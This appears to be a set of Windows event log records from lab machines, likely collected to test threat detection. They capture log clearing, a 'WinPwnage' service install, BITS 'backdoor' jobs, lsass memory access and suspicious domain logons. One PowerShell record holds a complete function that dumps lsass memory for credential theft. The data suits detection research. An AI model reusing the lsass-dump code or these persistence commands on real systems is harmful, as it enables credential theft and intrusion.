{"Timestamp": "2019-03-18 14:23:25.649776Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "PC01.example.corp", "SID": "S-1-5-21-1587066498-1489273250-1035260531-500", "EventID": 5145, "RecordID": 438262, "Level": "0", "Descr": "A network share object was checked to see whether client can be granted desired access", "Username": "Administrator", "Domain": "EXAMPLE", "LogonId": "0xfc635", "ObjectType": "File", "IP": "10.0.2.15", "Port": "55632", "ShareName": "\\\\*\\C$", "ShareLocalPath": "\\??\\C:\\", "RelativeTargetName": "Users\\user03\\Favorites\\Links for United States", "AccessMask": "0x100081", "AccessList": "SYNCHRONIZE, ReadData (or ListDirectory), ReadAttributes", "AccessReason": "-"}
{"Timestamp": "2019-03-18 14:23:25.649776Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "PC01.example.corp", "SID": "S-1-5-21-1587066498-1489273250-1035260531-500", "EventID": 5145, "RecordID": 438261, "Level": "0", "Descr": "A network share object was checked to see whether client can be granted desired access", "Username": "Administrator", "Domain": "EXAMPLE", "LogonId": "0xfc635", "ObjectType": "File", "IP": "10.0.2.15", "Port": "55632", "ShareName": "\\\\*\\C$", "ShareLocalPath": "\\??\\C:\\", "RelativeTargetName": "Users\\user03\\Favorites\\Links", "AccessMask": "0x100081", "AccessList": "SYNCHRONIZE, ReadData (or ListDirectory), ReadAttributes", "AccessReason": "-"}
{"Timestamp": "2019-03-18 14:23:25.649776Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "PC01.example.corp", "SID": "S-1-5-21-1587066498-1489273250-1035260531-500", "EventID": 5145, "RecordID": 438260, "Level": "0", "Descr": "A network share object was checked to see whether client can be granted desired access", "Username": "Administrator", "Domain": "EXAMPLE", "LogonId": "0xfc635", "ObjectType": "File", "IP": "10.0.2.15", "Port": "55632", "ShareName": "\\\\*\\C$", "ShareLocalPath": "\\??\\C:\\", "RelativeTargetName": "Users\\user03\\Favorites\\Links for United States\\desktop.ini", "AccessMask": "0x120089", "AccessList": "READ_CONTROL, SYNCHRONIZE, ReadData (or ListDirectory), ReadEA, ReadAttributes", "AccessReason": "-"}
{"Timestamp": "2019-03-18 14:23:25.649776Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "PC01.example.corp", "SID": "S-1-5-21-1587066498-1489273250-1035260531-500", "EventID": 5145, "RecordID": 438259, "Level": "0", "Descr": "A network share object was checked to see whether client can be granted desired access", "Username": "Administrator", "Domain": "EXAMPLE", "LogonId": "0xfc635", "ObjectType": "File", "IP": "10.0.2.15", "Port": "55632", "ShareName": "\\\\*\\C$", "ShareLocalPath": "\\??\\C:\\", "RelativeTargetName": "Users\\user03\\Favorites\\Links\\desktop.ini", "AccessMask": "0x120089", "AccessList": "READ_CONTROL, SYNCHRONIZE, ReadData (or ListDirectory), ReadEA, ReadAttributes", "AccessReason": "-"}
{"Timestamp": "2019-05-11 17:10:10.904945Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 4688, "RecordID": 18208, "Level": "0", "Descr": "A new process has been created", "Username": "IEWIN7$", "Domain": "WORKGROUP", "LogonId": "0x3e7", "NewProcessId": "0x8dc", "NewProcessPath": "C:\\Windows\\System32\\conhost.exe", "TokenElevationType": "TokenElevationTypeDefault (1)", "ProcessId": "0x188", "Command": null}
{"Timestamp": "2019-05-11 17:10:10.889320Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 4688, "RecordID": 18207, "Level": "0", "Descr": "A new process has been created", "Username": "IEWIN7$", "Domain": "WORKGROUP", "LogonId": "0x3e7", "NewProcessId": "0xc74", "NewProcessPath": "C:\\Windows\\System32\\cmd.exe", "TokenElevationType": "TokenElevationTypeDefault (1)", "ProcessId": "0x4f0", "Command": null}
{"Timestamp": "2019-05-11 17:10:10.889320Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "EventID": 4624, "RecordID": 18206, "Level": "0", "Descr": "An account was successfully logged on", "Username": "IEUser", "Domain": "IEWIN7", "LogonId": "0x1371b", "TargetSID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "TargetUsername": "IEUser", "TargetDomain": "IEWIN7", "TargetLogonId": "0x1bbdce", "LogonType+": "9", "LogonType": "9", "LogonProcess": "seclogo", "AuthenticationPackage": "Negotiate", "WorkstationName": null, "LogonGUID": "00000000-0000-0000-0000-000000000000", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x3c8", "ProcessPath": "C:\\Windows\\System32\\svchost.exe", "IP": "::1", "Port": "0"}
{"Timestamp": "2019-05-11 17:10:10.826820Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 4688, "RecordID": 18205, "Level": "0", "Descr": "A new process has been created", "Username": "IEWIN7$", "Domain": "WORKGROUP", "LogonId": "0x3e7", "NewProcessId": "0x5b0", "NewProcessPath": "C:\\Windows\\System32\\wusa.exe", "TokenElevationType": "TokenElevationTypeFull (2)", "ProcessId": "0x4f0", "Command": null}
{"Timestamp": "2019-05-11 17:10:10.795570Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 4688, "RecordID": 18204, "Level": "0", "Descr": "A new process has been created", "Username": "IEWIN7$", "Domain": "WORKGROUP", "LogonId": "0x3e7", "NewProcessId": "0x27c", "NewProcessPath": "C:\\Windows\\System32\\dllhost.exe", "TokenElevationType": "TokenElevationTypeDefault (1)", "ProcessId": "0x258", "Command": null}
{"Timestamp": "2019-05-11 17:10:10.795570Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 4673, "RecordID": 18203, "Level": "0", "Descr": "A privileged service was called", "Username": "IEWIN7$", "Domain": "WORKGROUP", "LogonId": "0x3e7", "ObjectServer": "NT Local Security Authority / Authentication Service", "Service": "LsaRegisterLogonProcess()", "PrivilegeList": "SeTcbPrivilege", "ProcessId": "0x1ec", "ProcessPath": "C:\\Windows\\System32\\lsass.exe"}
{"Timestamp": "2019-05-11 17:10:10.748695Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 4688, "RecordID": 18201, "Level": "0", "Descr": "A new process has been created", "Username": "IEWIN7$", "Domain": "WORKGROUP", "LogonId": "0x3e7", "NewProcessId": "0xec8", "NewProcessPath": "C:\\Windows\\System32\\dllhost.exe", "TokenElevationType": "TokenElevationTypeDefault (1)", "ProcessId": "0x258", "Command": null}
{"Timestamp": "2019-05-11 17:10:10.654945Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 4673, "RecordID": 18200, "Level": "0", "Descr": "A privileged service was called", "Username": "IEWIN7$", "Domain": "WORKGROUP", "LogonId": "0x3e7", "ObjectServer": "NT Local Security Authority / Authentication Service", "Service": "LsaRegisterLogonProcess()", "PrivilegeList": "SeTcbPrivilege", "ProcessId": "0x1ec", "ProcessPath": "C:\\Windows\\System32\\lsass.exe"}
{"Timestamp": "2019-05-11 17:10:10.623695Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 4688, "RecordID": 18198, "Level": "0", "Descr": "A new process has been created", "Username": "IEWIN7$", "Domain": "WORKGROUP", "LogonId": "0x3e7", "NewProcessId": "0x7f0", "NewProcessPath": "C:\\Windows\\System32\\consent.exe", "TokenElevationType": "TokenElevationTypeDefault (1)", "ProcessId": "0x3c8", "Command": null}
{"Timestamp": "2019-05-11 17:10:10.608070Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "EventID": 4688, "RecordID": 18197, "Level": "0", "Descr": "A new process has been created", "Username": "IEUser", "Domain": "IEWIN7", "LogonId": "0x13765", "NewProcessId": "0x628", "NewProcessPath": "C:\\Windows\\System32\\wusa.exe", "TokenElevationType": "TokenElevationTypeLimited (3)", "ProcessId": "0x4f0", "Command": null}
{"Timestamp": "2019-05-11 17:10:10.342445Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "IEWIN7", "SID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "EventID": 4688, "RecordID": 18196, "Level": "0", "Descr": "A new process has been created", "Username": "IEUser", "Domain": "IEWIN7", "LogonId": "0x13765", "NewProcessId": "0x4f0", "NewProcessPath": "C:\\Python27\\python.exe", "TokenElevationType": "TokenElevationTypeLimited (3)", "ProcessId": "0x12c", "Command": null}
{"Timestamp": "2019-05-11 17:10:06.342445Z", "Channel": "Security", "Provider": "Microsoft-Windows-Eventlog", "Hostname": "IEWIN7", "SID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "EventID": 1102, "RecordID": 18195, "Level": "Information", "Descr": "The audit log was cleared", "Username": "IEUser", "Domain": "IEWIN7", "LogonId": "0x1371b"}
{"Timestamp": "2019-05-12 12:52:43.702578Z", "Channel": "System", "Provider": "Service Control Manager", "Hostname": "IEWIN7", "SID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "EventID": 7045, "RecordID": 10446, "Level": "Information", "Descr": "A service was installed on the system", "ServiceName": "WinPwnage", "ServicePath": "%COMSPEC% /c ping -n 1 127.0.0.1 >nul && echo 'WinPwnage' > \\\\.\\pipe\\WinPwnagePipe", "ServiceType": "user mode service", "ServiceStartType": "demand start", "ServiceAccount": "LocalSystem"}
{"Timestamp": "2019-05-20 15:54:32.564900Z", "Channel": "Microsoft-Windows-WinRM/Operational", "Provider": "Microsoft-Windows-WinRM", "Hostname": "IEWIN7", "SID": "S-1-5-20", "EventID": 169, "RecordID": 861, "Level": "Information", "Descr": "<TargetUsername> authenticated successfully using <AuthMechanism>", "TargetUsername": "iewin7\\ieuser", "AuthMechanism": "NTLM"}
{"Timestamp": "2019-05-20 15:54:32.064406Z", "Channel": "Microsoft-Windows-WinRM/Operational", "Provider": "Microsoft-Windows-WinRM", "Hostname": "IEWIN7", "SID": "S-1-5-20", "EventID": 169, "RecordID": 840, "Level": "Information", "Descr": "<TargetUsername> authenticated successfully using <AuthMechanism>", "TargetUsername": "iewin7\\ieuser", "AuthMechanism": "NTLM"}
{"Timestamp": "2019-05-20 15:54:31.706910Z", "Channel": "Microsoft-Windows-WinRM/Operational", "Provider": "Microsoft-Windows-WinRM", "Hostname": "IEWIN7", "SID": "S-1-5-20", "EventID": 169, "RecordID": 834, "Level": "Information", "Descr": "<TargetUsername> authenticated successfully using <AuthMechanism>", "TargetUsername": "iewin7\\ieuser", "AuthMechanism": "NTLM"}
{"Timestamp": "2019-03-17 19:30:30.324836Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "PC04.example.corp", "SID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "EventID": 5142, "RecordID": 6273, "Level": "0", "Descr": "A network share object was added", "Username": "IEUser", "Domain": "PC04", "LogonId": "0x128a9", "ShareName": "\\\\*\\PRINT", "ShareLocalPath": "c:\\windows\\system32"}
{"Timestamp": "2019-03-17 19:26:42.116688Z", "Channel": "Security", "Provider": "Microsoft-Windows-Eventlog", "Hostname": "PC04.example.corp", "SID": "S-1-5-21-3583694148-1414552638-2922671848-1000", "EventID": 1102, "RecordID": 6272, "Level": "Information", "Descr": "The audit log was cleared", "Username": "IEUser", "Domain": "PC04", "LogonId": "0x128a9"}
{"Timestamp": "2020-09-23 16:58:45.835955Z", "Channel": "System", "Provider": "Service Control Manager", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": null, "EventID": 7036, "RecordID": 65380, "Level": "Information", "Descr": "The <ServiceName> entered the <StatusAfter> state", "ServiceName": "Windows Insider Service", "StatusAfter": "stopped"}
{"Timestamp": "2020-09-23 16:58:24.327043Z", "Channel": "System", "Provider": "Service Control Manager", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": null, "EventID": 7036, "RecordID": 65379, "Level": "Information", "Descr": "The <ServiceName> entered the <StatusAfter> state", "ServiceName": "TCP/IP NetBIOS Helper", "StatusAfter": "running"}
{"Timestamp": "2020-09-23 16:58:21.717638Z", "Channel": "System", "Provider": "Service Control Manager", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": null, "EventID": 7036, "RecordID": 65378, "Level": "Information", "Descr": "The <ServiceName> entered the <StatusAfter> state", "ServiceName": "Time Broker", "StatusAfter": "running"}
{"Timestamp": "2020-09-23 16:58:17.014461Z", "Channel": "System", "Provider": "Service Control Manager", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": null, "EventID": 7036, "RecordID": 65377, "Level": "Information", "Descr": "The <ServiceName> entered the <StatusAfter> state", "ServiceName": "Windows Event Log", "StatusAfter": "running"}
{"Timestamp": "2020-09-23 16:57:45.825782Z", "Channel": "System", "Provider": "Service Control Manager", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": null, "EventID": 7036, "RecordID": 65376, "Level": "Information", "Descr": "The <ServiceName> entered the <StatusAfter> state", "ServiceName": "Windows Insider Service", "StatusAfter": "running"}
{"Timestamp": "2020-09-23 16:57:41.372630Z", "Channel": "System", "Provider": "Service Control Manager", "Hostname": "01566s-win16-ir.threebeesco.com", "SID": null, "EventID": 7036, "RecordID": 65371, "Level": "Information", "Descr": "The <ServiceName> entered the <StatusAfter> state", "ServiceName": "Windows Error Reporting Service", "StatusAfter": "running"}
{"Timestamp": "2020-06-30 14:24:08.254605Z", "Channel": "Microsoft-Windows-PowerShell/Operational", "Provider": "Microsoft-Windows-PowerShell", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-21-3461203602-4096304019-2269080069-1000", "EventID": 4104, "RecordID": 971, "Level": "Warning", "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)", "MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": "function Memory($path)\n{\n\t\t\t  \n\t\t\t  \n\t\t$Process = Get-Process lsass\n\t\t$DumpFilePath = $path\n\t\t\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\n\t\n\t\t\t\n\t\t\t  #\n\t\t$ProcessId = $Process.Id\n\t\t$ProcessName = $Process.Name\n\t\t$ProcessHandle = $Process.Handle\n\t\t$ProcessFileName = \"$($ProcessName).dmp\"\n\t\t\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\n\t\t\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\n\t\t\t  \n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\n\t\t\t  \n\t\t$FileStream.Close()\n\t\t\n\t\tif (-not $Result)\n\t\t{\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\n\t\t\t$ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\n\t\t\t\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\n\t\t\t\n\t\t\tthrow $ExceptionMessage\n\t\t}\n\t\telse\n\t\t{\n\t\t\t\"Memdump complete!\"\n\t\t}\n\t\n}", "ScriptBlockId": "27f08bda-c330-419f-b83b-eb5c0f699930", "Path": "C:\\Users\\Public\\lsass_wer_ps.ps1"}
{"Timestamp": "2020-06-30 14:23:58.532115Z", "Channel": "Microsoft-Windows-PowerShell/Operational", "Provider": "Microsoft-Windows-PowerShell", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-21-3461203602-4096304019-2269080069-1000", "EventID": 40962, "RecordID": 970, "Level": "Information", "Descr": "PowerShell console is ready for user input"}
{"Timestamp": "2020-06-30 14:23:58.440339Z", "Channel": "Microsoft-Windows-PowerShell/Operational", "Provider": "Microsoft-Windows-PowerShell", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-21-3461203602-4096304019-2269080069-1000", "EventID": 53504, "RecordID": 969, "Level": "Information", "Descr": "Windows PowerShell has started an IPC listening thread on <ProcessPath> in <AppDomain>", "ProcessId": "7008", "AppDomain": "DefaultAppDomain"}
{"Timestamp": "2020-06-30 14:23:58.394425Z", "Channel": "Microsoft-Windows-PowerShell/Operational", "Provider": "Microsoft-Windows-PowerShell", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-21-3461203602-4096304019-2269080069-1000", "EventID": 40961, "RecordID": 968, "Level": "Information", "Descr": "PowerShell console is starting up"}
{"Timestamp": "2019-02-02 09:17:23.206182Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "ICORP-DC.internal.corp", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 65971, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-18", "TargetUsername": "ICORP-DC$", "TargetDomain": "INTERNAL.CORP", "TargetLogonId": "0x24db24", "LogonType+": "3", "LogonType": "3", "LogonProcess": "Kerberos", "AuthenticationPackage": "Kerberos", "WorkstationName": "-", "LogonGUID": "5A66FDFF-B4E8-5133-53A9-72A5DE1C31FB", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "::1", "Port": "50152", "RestrictedAdminMode": "-", "TargetOutboundUsername": "-", "TargetOutboundDomain": "-", "ElevatedToken": "Yes"}
{"Timestamp": "2019-02-02 09:17:23.193671Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "ICORP-DC.internal.corp", "SID": "S-1-5-21-2895268558-4179327395-2773671012-1108", "EventID": 4662, "RecordID": 65970, "Level": "0", "Descr": "An operation was performed on an object", "Username": "EXCHANGE$", "Domain": "ICORP", "LogonId": "0x24daa6", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{77f4548a-5e9d-4649-89f9-a0177c722361}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "WRITE_DAC", "AccessMask": "0x40000", "Properties": "%%1539\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
{"Timestamp": "2019-02-02 09:17:22.563018Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "ICORP-DC.internal.corp", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 65969, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-21-2895268558-4179327395-2773671012-1108", "TargetUsername": "EXCHANGE$", "TargetDomain": "ICORP", "TargetLogonId": "0x24daa6", "LogonType+": "3", "LogonType": "3", "LogonProcess": "NtLmSsp ", "AuthenticationPackage": "NTLM", "WorkstationName": "EXCHANGE", "LogonGUID": "00000000-0000-0000-0000-000000000000", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "192.168.111.87", "Port": "58128", "RestrictedAdminMode": "-", "TargetOutboundUsername": "-", "TargetOutboundDomain": "-", "ElevatedToken": "Yes"}
{"Timestamp": "2019-02-02 09:17:22.562534Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "ICORP-DC.internal.corp", "SID": null, "EventID": 4776, "RecordID": 65968, "Level": "0", "Descr": "The computer attempted to validate the credentials for an account", "AuthenticationPackage": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0", "TargetUsername": "EXCHANGE$", "WorkstationName": "EXCHANGE", "ResultCode+": "0x0", "ResultCode": "0x0"}
{"Timestamp": "2019-02-02 09:16:58.787262Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "ICORP-DC.internal.corp", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 65967, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-18", "TargetUsername": "ICORP-DC$", "TargetDomain": "INTERNAL.CORP", "TargetLogonId": "0x24c879", "LogonType+": "3", "LogonType": "3", "LogonProcess": "Kerberos", "AuthenticationPackage": "Kerberos", "WorkstationName": "-", "LogonGUID": "94BA67EA-8490-3C86-6DB7-DF74C9AA4449", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "127.0.0.1", "Port": "50151", "RestrictedAdminMode": "-", "TargetOutboundUsername": "-", "TargetOutboundDomain": "-", "ElevatedToken": "Yes"}
{"Timestamp": "2019-02-02 09:16:52.479004Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "ICORP-DC.internal.corp", "SID": null, "EventID": 4776, "RecordID": 65966, "Level": "0", "Descr": "The computer attempted to validate the credentials for an account", "AuthenticationPackage": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0", "TargetUsername": "helpdesk", "WorkstationName": "evil.internal.corp", "ResultCode+": "0x0", "ResultCode": "0x0"}
{"Timestamp": "2020-03-08 22:11:34.340584Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-21-3461203602-4096304019-2269080069-1000", "EventID": 4663, "RecordID": 314462, "Level": "0", "Descr": "An attempt was made to access an object", "Username": "IEUser", "Domain": "MSEDGEWIN10", "LogonId": "0x33392", "ObjectServer": "Security", "ObjectType": "Process", "ObjectName": "\\Device\\HarddiskVolume1\\Windows\\System32\\lsass.exe", "HandleId": "0x558", "AccessList": "Read from process memory", "AccessMask": "0x10", "ProcessId": "0x1688", "ProcessPath": "C:\\Windows\\System32\\cscript.exe", "ResourceAttributes": "-"}
{"Timestamp": "2019-11-15 08:19:17.134469Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "alice.insecurebank.local", "SID": null, "EventID": 4634, "RecordID": 25050, "Level": "0", "Descr": "An account was logged off", "TargetSID": "S-1-5-7", "TargetUsername": "ANONYMOUS LOGON", "TargetDomain": "NT AUTHORITY", "TargetLogonId": "0x1d12916", "LogonType+": "3", "LogonType": "3"}
{"Timestamp": "2019-11-15 08:19:16.102509Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "alice.insecurebank.local", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 25049, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-7", "TargetUsername": "ANONYMOUS LOGON", "TargetDomain": "NT AUTHORITY", "TargetLogonId": "0x1d12916", "LogonType+": "3", "LogonType": "3", "LogonProcess": "NtLmSsp ", "AuthenticationPackage": "NTLM", "WorkstationName": "-", "LogonGUID": "00000000-0000-0000-0000-000000000000", "TransmittedServices": "-", "KeyLength": "128", "ProcessId": "0x0", "ProcessPath": "-", "IP": "127.0.0.1", "Port": "59336"}
{"Timestamp": "2019-11-15 08:19:02.298512Z", "Channel": "Security", "Provider": "Microsoft-Windows-Eventlog", "Hostname": "alice.insecurebank.local", "SID": "S-1-5-21-1005675359-741490361-30848483-1108", "EventID": 1102, "RecordID": 25048, "Level": "Information", "Descr": "The audit log was cleared", "Username": "bob", "Domain": "insecurebank", "LogonId": "0x1c363a4"}
{"Timestamp": "2019-05-13 14:50:59.405301Z", "Channel": "Microsoft-Windows-Bits-Client/Operational", "Provider": "Microsoft-Windows-Bits-Client", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 60, "RecordID": 3828, "Level": "Information", "Descr": "BITS stopped transferring the <Name> transfer job that is associated with the <URL>", "TransferId": "905EB165-B377-4DEC-929B-6F6F124E02AA", "Name": "hola", "JobId": "51607467-5AB5-4DCB-AAF0-FB92C997C0BD", "URL": "C:\\Windows\\system32\\cmd.exe", "Peer": null, "FileTime": "2010-11-20 12:17:00.401 UTC", "FileSize": "302592", "BytesTotal": "302592", "BytesTransferred": "302592", "BytesTransferredFromPeer": "0"}
{"Timestamp": "2019-05-13 14:50:59.389676Z", "Channel": "Microsoft-Windows-Bits-Client/Operational", "Provider": "Microsoft-Windows-Bits-Client", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 59, "RecordID": 3827, "Level": "Information", "Descr": "BITS started the <Name> transfer job that is associated with the <URL>", "TransferId": "905EB165-B377-4DEC-929B-6F6F124E02AA", "Name": "hola", "JobId": "51607467-5AB5-4DCB-AAF0-FB92C997C0BD", "URL": "C:\\Windows\\system32\\cmd.exe", "Peer": null, "FileTime": "2010-11-20 12:17:00.401 UTC", "FileSize": "302592"}
{"Timestamp": "2019-05-13 14:50:01.999051Z", "Channel": "Microsoft-Windows-Bits-Client/Operational", "Provider": "Microsoft-Windows-Bits-Client", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 3, "RecordID": 3825, "Level": "Information", "Descr": "The BITS service created a new job"}
{"Timestamp": "2019-05-12 18:04:50.137072Z", "Channel": "Microsoft-Windows-Bits-Client/Operational", "Provider": "Microsoft-Windows-Bits-Client", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 60, "RecordID": 3818, "Level": "Information", "Descr": "BITS stopped transferring the <Name> transfer job that is associated with the <URL>", "TransferId": "2515F08C-3969-4086-B4EC-6E8ECA6B722E", "Name": "backdoor", "JobId": "B35C4A1D-4425-45BE-92D1-B67183AE222F", "URL": "C:\\Windows\\system32\\cmd.exe", "Peer": null, "FileTime": "2010-11-20 12:17:00.401 UTC", "FileSize": "302592", "BytesTotal": "302592", "BytesTransferred": "302592", "BytesTransferredFromPeer": "0"}
{"Timestamp": "2019-05-12 18:04:50.121447Z", "Channel": "Microsoft-Windows-Bits-Client/Operational", "Provider": "Microsoft-Windows-Bits-Client", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 59, "RecordID": 3817, "Level": "Information", "Descr": "BITS started the <Name> transfer job that is associated with the <URL>", "TransferId": "2515F08C-3969-4086-B4EC-6E8ECA6B722E", "Name": "backdoor", "JobId": "B35C4A1D-4425-45BE-92D1-B67183AE222F", "URL": "C:\\Windows\\system32\\cmd.exe", "Peer": null, "FileTime": "2010-11-20 12:17:00.401 UTC", "FileSize": "302592"}
{"Timestamp": "2019-05-12 18:02:05.215197Z", "Channel": "Microsoft-Windows-Bits-Client/Operational", "Provider": "Microsoft-Windows-Bits-Client", "Hostname": "IEWIN7", "SID": "S-1-5-18", "EventID": 3, "RecordID": 3815, "Level": "Information", "Descr": "The BITS service created a new job"}
{"Timestamp": "2019-09-01 11:54:22.450677Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-21-3461203602-4096304019-2269080069-1000", "EventID": 5145, "RecordID": 160445, "Level": "0", "Descr": "A network share object was checked to see whether client can be granted desired access", "Username": "IEUser", "Domain": "MSEDGEWIN10", "LogonId": "0x22329ce", "ObjectType": "File", "IP": "10.0.2.17", "Port": "51009", "ShareName": "\\\\*\\IPC$", "ShareLocalPath": null, "RelativeTargetName": "spoolss", "AccessMask": "0x12019f", "AccessList": "READ_CONTROL, SYNCHRONIZE, ReadData (or ListDirectory), WriteData (or AddFile), AppendData (or AddSubdirectory or CreatePipeInstance), ReadEA, WriteEA, ReadAttributes, WriteAttributes", "AccessReason": "-"}
{"Timestamp": "2020-11-13 11:49:17.458629Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 13327, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "UDP", "IPPort": "[10.0.2.16]:58260"}
{"Timestamp": "2020-11-13 11:49:17.383354Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 13306, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52786"}
{"Timestamp": "2020-11-13 11:48:38.956349Z", "Channel": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "Provider": "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-20", "EventID": 131, "RecordID": 13291, "Level": "Information", "Descr": "The server accepted a new <Protocol> connection from <IPPort>", "Protocol": "TCP", "IPPort": "10.0.2.16:52784"}
